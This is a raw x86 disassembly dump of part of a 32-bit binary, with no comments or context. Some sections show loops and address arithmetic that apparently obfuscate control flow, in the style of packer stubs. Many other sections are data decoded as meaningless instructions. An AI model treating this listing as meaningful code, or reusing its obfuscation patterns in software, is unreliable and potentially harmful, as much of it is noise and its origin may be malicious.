  405c62:	cmp    BYTE PTR [edx-0x386d5af0],dl
  405c68:	or     BYTE PTR [ecx-0x1a],dl
  405c6b:	mov    al,0x4a
  405c6d:	in     al,0xdf
  405c6f:	mov    eax,0x41fa356b
  405c74:	push   eax
  405c75:	leave  
  405c76:	adc    BYTE PTR [edx-0x6404824c],dh
  405c7c:	bound  ebp,QWORD PTR [ebx-0x49b959e6]
  405c82:	rcl    DWORD PTR [ebp-0x3a],0xc7
  405c86:	jns    0x405c90
  405c88:	lods   eax,DWORD PTR ds:[esi]
  405c89:	hlt    
  405c8a:	dec    edi
  405c8b:	inc    esi
  405c8c:	(bad)  
  405c8d:	imul   edi,DWORD PTR [edx],0xffffffaa
  405c90:	and    DWORD PTR [ebp+edi*4-0xf],ebp
  405c94:	jnp    0x405cac
  405c96:	(bad)  
  405c97:	lds    esi,FWORD PTR [ecx]
  405c99:	mov    al,ds:0x5b4e74a
  405c9e:	and    ebp,DWORD PTR [eax-0x5d141be4]
  405ca4:	sti    
  405ca5:	xchg   edi,eax
  405ca6:	pushf  
  405ca7:	pop    ebx
  405ca8:	aam    0xcf
  405caa:	mov    eax,ds:0x4451a0
  405caf:	mov    DWORD PTR [ebp-0x10],eax
  405cb2:	mov    eax,ds:0x4452ac
  405cb7:	sub    DWORD PTR ds:0x44e410,0x44b6cc
  405cc1:	mov    DWORD PTR [ebp-0x30],eax
  405cc4:	neg    eax
  405cc6:	mov    DWORD PTR [ebp-0xc],0xf89c8535
  405ccd:	adc    eax,DWORD PTR ds:0x4247ca
  405cd3:	mov    DWORD PTR [ebp-0x14],0xf89c8534
  405cda:	mov    eax,DWORD PTR [ebp-0xc]
  405cdd:	xor    DWORD PTR ds:0x44b6e0,0x59fc
  405ce7:	push   ebx
  405ce8:	or     DWORD PTR ds:0x4247da,0x4247d2
  405cf2:	push   esi
  405cf3:	adc    DWORD PTR ds:0x4247d2,edi
  405cf9:	push   edi
  405cfa:	mov    DWORD PTR ds:0x44b6d4,0x13
  405d04:	cmp    DWORD PTR ds:0x44b6d4,0x0
  405d0b:	je     0x405e95
  405d11:	cmp    DWORD PTR ds:0x44b6d4,0x3
  405d18:	jne    0x405d31
  405d1e:	push   0x141c
  405d23:	push   0x6005
  405d28:	push   DWORD PTR [ebp-0xc]
  405d2b:	call   DWORD PTR ds:0x4430e0
  405d31:	cmp    DWORD PTR ds:0x44b6d4,0x4
  405d38:	jne    0x405d4d
  405d3e:	xor    edi,edi
  405d40:	xor    edi,DWORD PTR ds:0x44b6d4
  405d46:	dec    edi
  405d47:	mov    DWORD PTR ds:0x44b6d4,edi
  405d4d:	mov    edi,DWORD PTR ds:0x44b6d4
  405d53:	dec    edi
  405d54:	mov    DWORD PTR ds:0x44b6d4,edi
  405d5a:	jmp    0x405d04
  405d5f:	and    DWORD PTR ds:0x448988,0x5029
  405d69:	jmp    0x405e95
  405d6e:	out    0xd6,eax
  405d70:	(bad)  
  405d71:	sub    al,0xf9
  405d73:	sub    al,0xf9
  405d75:	jmp    0x592bcf2a
  405d7a:	jae    0x405dce
  405d7c:	lds    edx,FWORD PTR [ecx+edx*4+0x21]
  405d80:	jl     0x405dfe
  405d82:	or     eax,0x107c7c7f
  405d87:	dec    ebp
  405d88:	push   eax
  405d89:	imul   esp,DWORD PTR [ebp+edi*8+0x3ce137c6],0x1f
  405d91:	pop    eax
  405d92:	pop    eax
  405d93:	mov    eax,ds:0x847d87a1
  405d98:	pop    ss
  405d99:	popf   
  405d9a:	sub    al,0x9
  405d9c:	and    BYTE PTR [edi+eiz*1-0x40],ah
  405da0:	pop    edx
  405da1:	xchg   esp,eax
  405da2:	jecxz  0x405d39
  405da4:	inc    esi
  405da5:	test   eax,0xccaf7a8b
  405daa:	push   edi
  405dab:	gs ds dec ebx
  405dae:	cli    
  405daf:	xor    bl,BYTE PTR [eax]
  405db1:	jmp    0xfc29:0x4a3deeac
  405db8:	xchg   esi,eax
  405db9:	push   0x76
  405dbb:	and    cl,BYTE PTR [edi]
  405dbd:	cdq    
  405dbe:	dec    ebx
  405dbf:	xchg   edi,eax
  405dc0:	mov    ds:0x7efe9d02,al
  405dc5:	js     0x405dbe
  405dc7:	sub    DWORD PTR [edx+0x797091df],edi
  405dcd:	jg     0x405d64
  405dcf:	(bad)
  405dd3:	mov    cl,0x88
  405dd5:	jg     0x405e4d
  405dd7:	fwait
  405dd8:	(bad)  
  405dd9:	in     eax,dx
  405dda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ddb:	stos   DWORD PTR es:[edi],eax
  405ddc:	call   0xe3a3:0x3fb9799a
  405de3:	jb     0x405dd4
  405de5:	inc    edi
  405de6:	sub    ecx,DWORD PTR [eax]
  405de8:	push   ebx
  405de9:	fnsave [edx+0x7]
  405dec:	je     0x405de1
  405dee:	adc    ah,dh
  405df0:	xor    eax,0x5769db84
  405df5:	xor    eax,0xb90960aa
  405dfa:	cmp    edi,ebp
  405dfc:	push   cs
  405dfd:	mov    DWORD PTR [ecx],edi
  405dff:	cli    
  405e00:	dec    edx
  405e01:	adc    al,0x22
  405e03:	xchg   ebx,eax
  405e04:	sub    BYTE PTR ds:0xcc14cb91,0xcc
  405e0b:	or     al,0x4c
  405e0d:	mov    ebx,0x60114bb2
  405e12:	dec    edx
  405e13:	dec    ebx
  405e14:	xchg   ebp,eax
  405e15:	shl    BYTE PTR [esi+0x2b],1
  405e18:	inc    edi
  405e19:	repz and cl,0x20
  405e1d:	shl    DWORD PTR [eax-0x10],0x53
  405e21:	loope  0x405e8d
  405e23:	lock adc ebp,DWORD PTR fs:[edi+0x177916d3]
  405e2b:	stos   DWORD PTR es:[edi],eax
  405e2c:	(bad)  
  405e2d:	and    ebp,DWORD PTR [edx-0x27]
  405e30:	mov    WORD PTR [edi-0x7],es
  405e33:	push   ebx
  405e34:	fcomp  QWORD PTR [edi+0x2ed4936d]
  405e3a:	jle    0x405e6f
  405e3c:	fisubr WORD PTR [edx-0x5c]
  405e3f:	cmc    
  405e40:	mov    eax,0x6dd4b6fd
  405e45:	cmc    
  405e46:	stos   DWORD PTR es:[edi],eax
  405e47:	rcr    BYTE PTR [ebx],1
  405e49:	lods   al,BYTE PTR ds:[esi]
  405e4a:	and    al,0xa3
  405e4c:	mov    BYTE PTR [ebx+0x130663c0],dh
  405e52:	lea    esp,[eax]
  405e54:	and    ecx,DWORD PTR [ecx*4-0x33c94cca]
  405e5b:	into   
  405e5c:	mov    BYTE PTR [edi],ah
  405e5e:	(bad)  
  405e5f:	dec    ebx
  405e60:	xchg   edi,eax
  405e61:	gs push edi
  405e63:	sahf   
  405e64:	aaa    
  405e65:	fisttp WORD PTR [ecx]
  405e67:	outs   dx,BYTE PTR ds:[esi]
  405e68:	mov    al,0xbc
  405e6a:	bound  ecx,QWORD PTR [edi+0x57ae6b88]
  405e70:	adc    BYTE PTR [esp+ebp*2+0x12],dh
  405e74:	xor    al,0x66
  405e76:	inc    edi
  405e77:	icebp  
  405e78:	pop    si
  405e7a:	add    DWORD PTR ds:0x76693b35,eax
  405e80:	add    eax,0xa715c92e
  405e85:	sbb    eax,0x26036931
  405e8a:	mov    bl,0x6a
  405e8c:	jmp    0xde38:0xcb58a4d2
  405e93:	int3   
  405e94:	movsx  edx,BYTE PTR [edi+0x8]
  405e98:	push   ecx
  405e99:	pop    es
  405e9a:	xor    eax,esi
  405e9c:	movzx  edi,WORD PTR ds:0x410753
  405ea3:	xor    DWORD PTR ds:0x448980,edi
  405ea9:	mov    edi,0x32729e
  405eae:	jmp    0x405fda
  405eb3:	icebp  
  405eb4:	popa   
  405eb5:	jno    0x405f2b
  405eb7:	loope  0x405f1d
  405eb9:	mov    DWORD PTR [ecx-0x35],edi
  405ebc:	add    esi,DWORD PTR [esi+0x2d]
  405ebf:	xchg   esi,eax
  405ec0:	add    al,0x21
  405ec2:	jae    0x405e72
  405ec4:	and    BYTE PTR [esp+edi*2+0xd],bh
  405ec8:	jg     0x405f46
  405eca:	jl     0x405e8c
  405ecc:	retf   
  405ecd:	mov    bh,0xdd
  405ecf:	inc    ebp
  405ed0:	inc    edi
  405ed1:	jae    0x405e8f
  405ed3:	aam    0x41
  405ed5:	or     al,BYTE PTR [esi]
  405ed7:	(bad)  
  405ed8:	fdivr  QWORD PTR [ebp-0x77a8a497]
  405ede:	es aaa 
  405ee0:	adc    al,0x1e
  405ee2:	nop
  405ee3:	test   BYTE PTR [ebx],0x1f
  405ee6:	shl    DWORD PTR [ebx+0x54],0x6b
  405eea:	cmp    eax,0xb421c300
  405eef:	cmp    DWORD PTR [ecx+0x59],0xfcae1c46
  405ef6:	push   0x7a
  405ef8:	lods   al,BYTE PTR ds:[esi]
  405ef9:	push   edx
  405efa:	loop   0x405f6c
  405efc:	pop    ebx
  405efd:	div    DWORD PTR [ecx-0x1d]
  405f00:	loope  0x405f3a
  405f02:	iret   
  405f03:	aam    0xc7
  405f05:	in     al,0x32
  405f07:	push   cs
  405f08:	or     eax,0x8bf1f849
  405f0d:	scas   al,BYTE PTR es:[edi]
  405f0e:	test   BYTE PTR [esi+0x3afea37c],0xe7
  405f15:	inc    edi
  405f16:	mov    eax,ds:0xe83a872e
  405f1b:	jb     0x405f84
  405f1d:	iret   
  405f1e:	lods   al,BYTE PTR ds:[esi]
  405f1f:	mov    eax,DWORD PTR [esi+0x3c]
  405f22:	(bad)  
  405f23:	std    
  405f24:	dec    ebx
  405f25:	sbb    ecx,DWORD PTR [esi]
  405f27:	and    DWORD PTR [esi+0x4],eax
  405f2a:	or     DWORD PTR [edx-0x3f6d6aa3],edx
  405f30:	dec    ecx
  405f31:	add    esi,DWORD PTR ds:0xcc4e92f8
  405f37:	repnz sub al,BYTE PTR [eax+0x3ee2696e]
  405f3e:	pop    es
  405f3f:	dec    edx
  405f40:	in     eax,dx
  405f41:	dec    edi
  405f42:	mov    ebp,0x329bbed2
  405f47:	sbb    eax,DWORD PTR [edi-0x28]
  405f4a:	xchg   ebx,eax
  405f4b:	pop    ebp
  405f4c:	ret    
  405f4d:	(bad)  
  405f4e:	mov    ds:0x6cc9363a,al
  405f53:	add    al,0xf6
  405f55:	pop    ebx
  405f56:	scas   al,BYTE PTR es:[edi]
  405f57:	nop
  405f58:	dec    ebp
  405f59:	mov    esp,DWORD PTR [edx]
  405f5b:	dec    esi
  405f5c:	mov    es,WORD PTR [esi+0x7d]
  405f5f:	popa   
  405f60:	inc    esp
  405f61:	cmp    al,0x5
  405f63:	out    0xd1,eax
  405f65:	fild   DWORD PTR [eax+0x6e1cd6ab]
  405f6b:	mov    ebx,0x3d99f051
  405f70:	imul   eax,DWORD PTR [ebp-0xa],0x12b1bf10
  405f77:	lock (bad) 
  405f79:	dec    edi
  405f7a:	lods   al,BYTE PTR ds:[esi]
  405f7b:	adc    al,0x56
  405f7d:	mov    esp,0x343a5d2
  405f82:	jnp    0x405f91
  405f84:	adc    DWORD PTR [ebp-0x68],0x2eac2970
  405f8b:	mov    esp,0xe847296c
  405f90:	dec    ecx
  405f91:	mov    eax,0xdb23a292
  405f96:	xchg   edi,eax
  405f97:	and    DWORD PTR [eax+0x42ffbaa9],edx
  405f9d:	popa   
  405f9e:	das    
  405f9f:	cdq    
  405fa0:	pop    ds
  405fa1:	clc    
  405fa2:	sbb    bl,al
  405fa4:	sub    ecx,DWORD PTR [esi-0x24]
  405fa7:	std    
  405fa8:	mov    bl,0x49
  405faa:	ret    0x1622
  405fad:	(bad)  
  405fae:	outs   dx,DWORD PTR ds:[esi]
  405faf:	mov    ebp,0x8d391e09
  405fb4:	mov    ds:0x8e15d642,al
  405fb9:	adc    eax,0x6178ed6d
  405fbe:	push   edx
  405fbf:	sbb    al,0xee
  405fc1:	in     al,0x8e
  405fc3:	es push ecx
  405fc5:	das    
  405fc6:	daa    
  405fc7:	repz pop ebx
  405fc9:	int3   
  405fca:	jmp    0x772f:0x1cabc3b1
  405fd1:	retf   
  405fd2:	cdq    
  405fd3:	mov    dl,0x93
  405fd5:	repnz shl esi,1
  405fd8:	xlat   BYTE PTR ds:[ebx]
  405fd9:	jecxz  0x405fde
  405fdb:	(bad)  
  405fdc:	mov    DWORD PTR [ebp-0x20],eax
  405fdf:	mov    DWORD PTR ds:0x4247ce,0x15
  405fe9:	cmp    DWORD PTR ds:0x4247ce,0x0
  405ff0:	je     0x406021
  405ff6:	cmp    DWORD PTR ds:0x4247ce,0x23
  405ffd:	jne    0x40600e
  406003:	push   0x410927
  406008:	call   DWORD PTR ds:0x4430e4
  40600e:	xor    eax,eax
  406010:	or     eax,DWORD PTR ds:0x4247ce
  406016:	dec    eax
  406017:	mov    ds:0x4247ce,eax
  40601c:	jmp    0x405fe9
  406021:	mov    DWORD PTR [ebp-0x28],0xf89cb535
  406028:	mov    DWORD PTR [ebp-0x34],0xf89f0535
  40602f:	mov    DWORD PTR ds:0x448994,0x1696
  406039:	mov    DWORD PTR [ebp-0x2c],0xf89c85f5
  406040:	or     DWORD PTR ds:0x44b6e0,edx
  406046:	mov    DWORD PTR [ebp-0x24],0xf89c85d5
  40604d:	and    DWORD PTR ds:0x410743,0x0
  406057:	jmp    0x40606a
  40605c:	xor    eax,eax
  40605e:	xor    eax,DWORD PTR ds:0x410743
  406064:	inc    eax
  406065:	mov    ds:0x410743,eax
  40606a:	cmp    DWORD PTR ds:0x410743,0x1c
  406071:	jae    0x4060ad
  406077:	cmp    DWORD PTR ds:0x410743,0x2b
  40607e:	jne    0x4060a3
  406084:	push   0x78a8
  406089:	push   0x44b6e0
  40608e:	push   0x8180
  406093:	push   0x6239
  406098:	push   0x1782
  40609d:	call   DWORD PTR ds:0x443364
  4060a3:	jmp    0x40605c
  4060a8:	xor    eax,0x3639
  4060ad:	mov    eax,DWORD PTR [ebp-0xc]
  4060b0:	add    DWORD PTR ds:0x4489a4,0x2d0a
  4060ba:	xor    eax,esi
  4060bc:	sbb    DWORD PTR ds:0x4247be,0x6315
  4060c6:	add    eax,edi
  4060c8:	mov    DWORD PTR [ebp-0x18],eax
  4060cb:	or     DWORD PTR ds:0x44e414,0x658e
  4060d5:	mov    DWORD PTR [ebp-0x1c],0xf89c8530
  4060dc:	mov    BYTE PTR [ebp-0x1],0x57
  4060e0:	or     DWORD PTR ds:0x448994,edi
  4060e6:	mov    eax,DWORD PTR [ebp-0xc]
  4060e9:	xor    eax,esi
  4060eb:	add    eax,edi
  4060ed:	sbb    DWORD PTR ds:0x410753,0x34b4
  4060f7:	mov    DWORD PTR [ebp-0x18],eax
  4060fa:	dec    DWORD PTR ds:0x448998
  406100:	mov    eax,DWORD PTR [ebp-0x24]
  406103:	xor    eax,esi
  406105:	adc    DWORD PTR ds:0x41074b,0x44898c
  40610f:	add    eax,edi
  406111:	xor    DWORD PTR ds:0x448994,0x44e420
  40611b:	push   eax
  40611c:	mov    eax,DWORD PTR [ebp-0x28]
  40611f:	xor    eax,esi
  406121:	sbb    DWORD PTR ds:0x44899c,0x1e41
  40612b:	add    eax,edi
  40612d:	xor    DWORD PTR ds:0x448994,0x44e424
  406137:	push   eax
  406138:	and    DWORD PTR ds:0x41073f,0x0
  406142:	mov    eax,ds:0x41073f
  406147:	inc    eax
  406148:	mov    ds:0x41073f,eax
  40614d:	cmp    DWORD PTR ds:0x41073f,0xc
  406154:	jne    0x406170
  40615a:	push   0x8a0b
  40615f:	push   0x44b6d0
  406164:	push   DWORD PTR [ebp-0x28]
  406167:	push   DWORD PTR [ebp-0x20]
  40616a:	call   DWORD PTR ds:0x4430e8
  406170:	cmp    DWORD PTR ds:0x41073f,0xb
  406177:	jne    0x40618b
  40617d:	xor    eax,eax
  40617f:	add    eax,DWORD PTR ds:0x41073f
  406185:	inc    eax
  406186:	mov    ds:0x41073f,eax
  40618b:	cmp    DWORD PTR ds:0x41073f,0x17
  406192:	jb     0x406142
  406198:	movzx  eax,BYTE PTR ds:0x4247c6
  40619f:	xor    DWORD PTR ds:0x44b6d8,eax
  4061a5:	mov    eax,DWORD PTR [ebp-0x1c]
  4061a8:	neg    DWORD PTR ds:0x4247ce
  4061ae:	xor    eax,esi
  4061b0:	add    eax,edi
  4061b2:	or     DWORD PTR ds:0x44b6d8,0x41073f
  4061bc:	jmp    0x4062e8
  4061c1:	sar    DWORD PTR [ebp+0x7d793df9],cl
  4061c7:	sar    DWORD PTR [ebp+0x7a],cl
  4061ca:	sub    eax,0x61af1da
  4061cf:	xor    ecx,DWORD PTR [edx-0x41]
  4061d2:	and    edi,DWORD PTR [esp+edi*2+0xd]
  4061d6:	jg     0x406254
  4061d8:	jl     0x4061cc
  4061da:	sar    BYTE PTR [ecx-0x12],cl
  4061dd:	addr16 clc 
  4061df:	retf   
  4061e0:	inc    edx
  4061e1:	inc    ebx
  4061e2:	mov    ebx,0xfa4f3833
  4061e7:	lods   eax,DWORD PTR ds:[esi]
  4061e8:	inc    ecx
  4061e9:	sub    al,0xf4
  4061eb:	mov    cs,WORD PTR ds:0xfbf35f0b
  4061f1:	push   esi
  4061f2:	mov    ds:0x66ad7fee,al
  4061f7:	test   eax,0xbef8d6e4
  4061fc:	stos   BYTE PTR es:[edi],al
  4061fd:	test   eax,0xbec34f4e
  406202:	test   BYTE PTR [esi],0x9
  406205:	dec    ebp
  406206:	dec    edi
  406207:	(bad)  
  406208:	sar    DWORD PTR [edi],cl
  40620a:	ret    
  40620b:	jg     0x40627b
  40620d:	lahf   
  40620e:	loopne 0x40624b
  406210:	mov    ds:0x4b6da624,eax
  406215:	dec    esp
  406216:	xor    ch,bl
  406218:	sti    
  406219:	cmc    
  40621a:	leave  
  40621b:	into   
  40621c:	loopne 0x4061d1
  40621e:	xor    al,BYTE PTR [ecx+eiz*2+0x2d7dc3a9]
  406225:	dec    edx
  406226:	xlat   BYTE PTR ds:[ebx]
  406227:	add    al,0x5d
  406229:	sub    al,BYTE PTR [ebx]
  40622b:	or     eax,0x7628de52
  406230:	xor    eax,0x128c0ffb
  406235:	ins    DWORD PTR es:[edi],dx
  406236:	in     al,0x72
  406238:	xchg   ebp,eax
  406239:	seta   cl
  40623c:	cmp    BYTE PTR [edi+ebp*1-0x65],0xaa
  406241:	mov    ch,0x17
  406243:	stos   DWORD PTR es:[edi],eax
  406244:	iret   
  406245:	adc    ch,dh
  406247:	pop    eax
  406248:	out    0xc3,al
  40624a:	pop    esi
  40624b:	jle    0x4061ce
  40624d:	pop    esp
  40624e:	frstor [edi+0x4b]
  406251:	pushf  
  406252:	call   0x64a7:0xc0440429
  406259:	xlat   BYTE PTR ds:[ebx]
  40625a:	mov    ch,BYTE PTR ds:0x7a6dd75f
  406260:	jecxz  0x406262
  406262:	sub    BYTE PTR [edx+0x17],bh
  406265:	clc    
  406266:	call   0x14f8:0x8bff55a1
  40626d:	inc    eax
  40626e:	xchg   edx,eax
  40626f:	icebp  
  406270:	pusha  
  406271:	test   al,0x6d
  406273:	mov    DWORD PTR [edx],edi
  406275:	ja     0x4062cc
  406277:	sub    BYTE PTR [edx+0x3a],bl
  40627a:	mov    al,ds:0xffddbe3
  40627f:	cmp    BYTE PTR [esi+0x56],al
  406282:	adc    BYTE PTR [ebx+0x29],bh
  406285:	xchg   ebp,eax
  406286:	sbb    eax,0x916e9e3c
  40628b:	xlat   BYTE PTR ds:[ebx]
  40628d:	cmp    bh,cl
  40628f:	imul   edx,ebx,0xffffff8c
  406292:	xchg   esp,eax
  406293:	cmp    dl,bh
  406295:	loope  0x406221
  406297:	imul   eax,ebx,0x26e2479e
  40629d:	cli    
  40629e:	stos   DWORD PTR es:[edi],eax
  40629f:	call   0x25bddc20
  4062a4:	adc    bh,ah
  4062a6:	popf   
  4062a7:	mov    edi,0x2fa938b7
  4062ac:	jae    0x406292
  4062ae:	jle    0x406312
  4062b0:	dec    eax
  4062b1:	ins    BYTE PTR es:[edi],dx
  4062b2:	loope  0x406260
  4062b4:	or     ecx,DWORD PTR ds:0x5093b60f
  4062ba:	ror    DWORD PTR [ecx+0x3d],cl
  4062bd:	aaa    
  4062be:	frstor [ebp-0x44]
  4062c1:	dec    eax
  4062c2:	sbb    DWORD PTR ds:0x3ad6dd4c,0xfd17ee87
  4062cc:	add    al,0x23
  4062ce:	mov    al,0x9f
  4062d0:	(bad)  
  4062d1:	push   ebx
  4062d2:	xor    DWORD PTR [edx],ebp
  4062d4:	sub    DWORD PTR [eax-0x21],edx
  4062d7:	and    eax,0x21f3a140
  4062dc:	mov    esi,0x9c9e452b
  4062e1:	mov    edx,0x39332e59
  4062e6:	and    al,0x91
  4062e8:	push   eax
  4062e9:	lea    eax,[ebp-0x78]
  4062ec:	add    DWORD PTR ds:0x44e410,0x44e418
  4062f6:	push   eax
  4062f7:	or     DWORD PTR ds:0x4489a4,0x4247ca
  406301:	push   DWORD PTR [ebp-0xc]
  406304:	add    DWORD PTR ds:0x44b6cc,0x4247d2
  40630e:	jmp    0x40643a
  406313:	push   edx
  406314:	repz fist WORD PTR [ebp-0x4cadaa2f]
  40631b:	adc    DWORD PTR [esi-0x1bfdcf51],esp
  406321:	shr    BYTE PTR [esp+ecx*2+0xd7c7c22],1
  406328:	jg     0x4063a6
  40632a:	jl     0x406372
  40632c:	sub    dh,BYTE PTR [ebx]
  40632e:	inc    esi
  40632f:	pusha  
  406330:	mov    edi,0x2b6a76b6
  406335:	mov    esp,0xfa8748dd
  40633a:	(bad)  [eax-0x35]
  40633d:	cmp    cl,dl
  40633f:	pop    eax
  406340:	sub    BYTE PTR [ebx+0x14a047c5],bh
  406346:	dec    eax
  406347:	std    
  406348:	(bad)  
  406349:	push   ds
  40634a:	mov    cl,0x44
  40634c:	or     BYTE PTR [edi],cl
  40634e:	add    DWORD PTR [edi+0x14],eax
  406351:	int    0x77
  406353:	sbb    DWORD PTR [esi],ecx
  406355:	icebp  
  406356:	dec    ebp
  406357:	lds    ebp,FWORD PTR [edi+ebp*4+0x77c0378f]
  40635e:	add    esi,0x66
  406361:	sbb    cl,BYTE PTR [esi+0x6c]
  406364:	rcr    DWORD PTR [ebp+0x24a25d89],0xad
  40636b:	outs   dx,BYTE PTR ds:[esi]
  40636c:	pop    edi
  40636d:	shl    DWORD PTR [esi],cl
  40636f:	adc    edx,DWORD PTR [esi+0x24]
  406372:	or     esp,esp
  406374:	xor    eax,0x6210c73e
  406379:	add    edx,esi
  40637b:	mov    al,0x28
  40637d:	xchg   ebp,eax
  40637e:	or     esi,ecx
  406380:	fadd   QWORD PTR [esi-0x48be8dc5]
  406386:	and    DWORD PTR [edi-0x5a90a044],esi
  40638c:	in     eax,0xd2
  40638e:	mov    al,ds:0x72676e2f
  406393:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406394:	call   0xb29:0xd5cc5d7c
  40639b:	stc    
  40639c:	pusha  
  40639d:	cmp    eax,0x6ce886c2
  4063a2:	loopne 0x4063f4
  4063a4:	sub    eax,0x989408a8
  4063a9:	in     al,0xb3
  4063ab:	loop   0x406364
  4063ad:	out    dx,eax
  4063ae:	hlt    
  4063af:	cmp    edx,DWORD PTR [eax+0x78]
  4063b2:	jp     0x406344
  4063b4:	mov    cl,0x69
  4063b6:	out    0x45,al
  4063b8:	inc    esp
  4063b9:	inc    esp
  4063ba:	hlt    
  4063bb:	dec    edi
  4063bc:	xchg   edi,eax
  4063bd:	push   esp
  4063be:	push   ebp
  4063bf:	dec    eax
  4063c0:	dec    edi
  4063c1:	(bad)  [eax]
  4063c3:	xchg   ecx,eax
  4063c4:	rol    BYTE PTR [ecx-0x10f210de],0x90
  4063cb:	dec    edi
  4063cc:	cmp    eax,0x65ba51de
  4063d1:	adc    BYTE PTR [ecx-0x32f66e62],0x4d
  4063d8:	ins    BYTE PTR es:[edi],dx
  4063d9:	xor    al,0x69
  4063db:	xor    al,0x45
  4063dd:	push   ecx
  4063de:	(bad)  
  4063df:	call   0x7e304162
  4063e4:	test   al,0xb7
  4063e6:	fmul   st(5),st
  4063e8:	sbb    DWORD PTR [esi+eax*1],eax
  4063eb:	sbb    BYTE PTR [eax+ebp*8],0xde
  4063ef:	jl     0x406421
  4063f1:	std    
  4063f2:	cmp    eax,0x45d744ba
  4063f7:	pop    ebx
  4063f8:	or     eax,0xdef4dea5
  4063fd:	int    0x5
  4063ff:	rcr    BYTE PTR [ecx-0x3ad43420],0x49
  406406:	ins    BYTE PTR es:[edi],dx
  406407:	push   esi
  406408:	adc    DWORD PTR [ebx],esi
  40640a:	or     BYTE PTR [ecx+0x1c3d6cd],ah
  406410:	pusha  
  406411:	ds jp  0x4063c0
  406414:	or     ebx,edi
  406416:	sbb    eax,0x8b96dc88
  40641b:	and    BYTE PTR [ecx+edi*1+0x5149ad01],0xe3
  406423:	mov    eax,0x3f68eec1
  406428:	push   0x1
  40642a:	pop    edi
  40642b:	mov    al,0xa6
  40642d:	cmc    
  40642e:	cli    
  40642f:	push   edx
  406430:	fldcw  WORD PTR [esi-0x7b802b5f]
  406436:	mov    eax,ds:0xff797ced
  40643b:	jne    0x406429
  40643d:	jmp    0x406569
  406442:	xchg   BYTE PTR [edi-0x29ad99e],ah
  406448:	pop    edx
  406449:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40644a:	inc    eax
  40644b:	adc    al,0x79
  40644d:	sub    al,0xd2
  40644f:	push   eax
  406450:	adc    ah,BYTE PTR [ebx*2+0xd7c7c25]
  406457:	jg     0x4064d5
  406459:	jl     0x4063f1
  40645b:	and    dh,BYTE PTR [edi]
  40645d:	idiv   ebx
  40645f:	ds clc 
  406461:	sub    DWORD PTR [ebp-0x7f],esp
  406464:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406465:	mul    DWORD PTR [eax]
  406467:	das    
  406468:	sti    
  406469:	pop    ebp
  40646a:	sahf   
  40646b:	push   cs
  40646c:	mov    bh,BYTE PTR [ebx-0x29c89d3c]
  406472:	lds    ebx,FWORD PTR [ebx]
  406474:	fldln2 
  406476:	push   ecx
  406477:	xchg   ebp,eax
  406478:	call   0x8e979256
  40647d:	dec    ebx
  40647e:	xor    cl,BYTE PTR [ebp+0x1f58835c]
  406484:	xchg   ebx,eax
  406485:	adc    al,al
  406487:	lahf   
  406488:	and    DWORD PTR [eax-0x4d7f62a1],ecx
  40648e:	push   eax
  40648f:	mov    si,0x8a6f
  406493:	popa   
  406494:	xchg   esp,eax
  406495:	stos   BYTE PTR es:[edi],al
  406496:	jp     0x4064d6
  406498:	test   al,0xe6
  40649a:	retf   
  40649b:	add    ah,BYTE PTR [eax+eiz*4]
  40649e:	pop    ds
  40649f:	into   
  4064a0:	out    dx,eax
  4064a1:	sti    
  4064a2:	out    dx,al
  4064a3:	fisttp WORD PTR [ebx-0x33c3e00b]
  4064a9:	xchg   ecx,eax
  4064aa:	test   ecx,0xe4ff7c5d
  4064b0:	push   ds
  4064b1:	sub    eax,0x7efd0cf6
  4064b6:	xchg   ecx,eax
  4064b7:	sub    al,0xc0
  4064b9:	pusha  
  4064ba:	fsub   DWORD PTR [edi+0x9dfaaf3]
  4064c0:	mov    dl,0x0
  4064c2:	cs std 
  4064c4:	pop    edx
  4064c5:	mov    ecx,0xa10b6701
  4064ca:	sahf   
  4064cb:	jmp    0x406505
  4064cd:	or     cl,BYTE PTR [ebx*4+0x7e94cd14]
  4064d4:	out    dx,al
  4064d5:	xchg   esi,eax
  4064d6:	cld    
  4064d7:	mov    al,0x3f
  4064d9:	retf   0xe6c6
  4064dc:	call   0x42e9:0xdd27c663
  4064e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4064e4:	ja     0x4064b3
  4064e6:	(bad)  
  4064e7:	jmp    0x406536
  4064e9:	in     al,0x81
  4064eb:	enter  0xcc85,0x55
  4064ef:	push   ebx
  4064f0:	cmp    dh,BYTE PTR [edx+0x27]
  4064f3:	std    
  4064f4:	jecxz  0x40647c
  4064f6:	and    BYTE PTR [esi],bh
  4064f8:	push   esi
  4064f9:	xchg   ebx,eax
  4064fa:	fstp   QWORD PTR [edx+0x1e]
  4064fd:	sbb    eax,0x72de499d
  406502:	ds cmp al,0x4b
  406505:	ret    
  406506:	and    al,0x14
  406508:	fucomip st,st(2)
  40650a:	cmp    eax,0x67bdaa93
  40650f:	mov    edi,0x61a66013
  406514:	add    DWORD PTR [edx-0x52],ecx
  406517:	push   es
  406518:	sub    DWORD PTR [esi+ecx*1-0x4c47a55e],ebp
  40651f:	mov    al,0xe
  406521:	add    dh,BYTE PTR [ebx]
  406523:	sub    edi,0x10e408bf
  406529:	jne    0x406530
  40652b:	repnz pushf 
  40652d:	retf   0x6f39
  406530:	inc    edx
  406531:	int3   
  406532:	out    dx,eax
  406533:	xchg   BYTE PTR [esi],al
  406535:	out    dx,eax
  406536:	js     0x406592
  406538:	jo     0x4064c2
  40653a:	push   0x6dd92f11
  40653f:	mov    ss,eax
  406541:	add    eax,0xbe3a94d1
  406546:	cmp    al,0x70
  406548:	cmp    edx,edi
  40654a:	daa    
  40654b:	loope  0x40658a
  40654d:	ret    0xcb07
  406550:	mul    edi
  406552:	inc    ebp
  406553:	popa   
  406554:	enter  0x1949,0x86
  406558:	add    DWORD PTR [edx-0x40369407],edx
  40655e:	jne    0x40651b
  406560:	aaa    
  406561:	out    dx,eax
  406562:	and    bh,BYTE PTR [edx+0x15]
  406565:	push   edx
  406566:	mov    edx,0xb2e864b0
  40656b:	jmp    0x40656c
  40656d:	inc    DWORD PTR [ebp-0x497bf040]
  406573:	add    eax,DWORD PTR [eax]
  406575:	add    BYTE PTR [ecx+0x41075b1d],al
  40657b:	add    BYTE PTR [ecx+ecx*4+0x458d0044],bl
  406582:	mov    BYTE PTR [eax-0x75],dl
  406585:	inc    ebp
  406586:	in     al,dx
  406587:	xor    eax,esi
  406589:	add    eax,edi
  40658b:	push   eax
